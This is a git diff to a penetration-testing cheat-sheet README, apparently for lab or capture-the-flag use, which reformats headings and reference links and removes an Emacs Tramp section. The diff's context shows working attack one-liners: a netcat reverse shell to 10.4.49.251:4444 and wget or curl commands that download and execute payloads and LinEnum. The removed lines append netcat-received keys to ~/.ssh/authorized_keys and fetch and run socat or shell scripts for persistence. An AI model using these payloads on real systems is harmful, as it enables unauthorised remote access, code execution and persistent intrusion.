@@ -34,7 +34,7 @@
 - [SMTP](service/smtp.md)
 - [MySQL](service/mysql.md)
 
-## Useful Commands
+## Commands
 ### Shell payload
 ```
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f
@@ -53,7 +53,7 @@ FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FI
 FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; /tmp/$FILE
 ```
 
-### LinEnum
+#### LinEnum
 ```
 curl 10.10.14.7/LinEnum.sh | bash
 wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; bash /tmp/LinEnum.sh
@@ -75,23 +75,6 @@ socat file:`tty`,raw,echo=0 TCP-L:4445
 export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
 
-### Tramp (Emacs)
-
-#### Basic
-```
-ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; }
-```
-
-#### Socat Pattern
-```
-ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/socat && chmod +x /tmp/socat && /tmp/socat file:`tty`,raw,echo=0 TCP-L:7777; }
-```
-
-#### Shell Upgrade Pattern
-```
-ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/upgrade-shell.sh && chmod +x /tmp/upgrade-shell.sh && . /tmp/upgrade-shell.sh; }
-```
-
 ## CVEs
 - CVE : 2014-6287 ([39161](cve/cve-2014-6287-39161.md))
 - CVE : 2014-6287 ([49125](cve/cve-2014-6287-49125.md))
@@ -99,35 +82,19 @@ ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ss
 
 ## Reference
 ### Tools
-CrackStation  
-https://crackstation.net/
-
-Hash Analyzer  
-https://www.tunnelsup.com/hash-analyzer/
-
-CyberChef  
-https://gchq.github.io/CyberChef/
+- [CrackStation](https://crackstation.net/)
+- [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)
+- [CyberChef](https://gchq.github.io/CyberChef/)
 
 ### Exploit Search
-Exploit DB  
-https://www.exploit-db.com/
-
-GTFOBins  
-https://gtfobins.github.io/
+- [Exploit DB](https://www.exploit-db.com/)
+- [GTFOBins](https://gtfobins.github.io/)
 
 ### Document
-MSF Console Commands  
-https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
-
-Meterpreter Commands  
-https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
+- [MSF Console Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
+- [Meterpreter Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
 
 ### Cheatsheet
-PayloadsAllTheThings / Reverse Shell Cheat Sheet
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-
-PayloadsAllTheThings / Linux - Privilege Escalation
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries
-
-Upgrading Simple Shells to Fully Interactive TTYs  
-https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+- [PayloadsAllTheThings / Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [PayloadsAllTheThings / Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries)
+- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
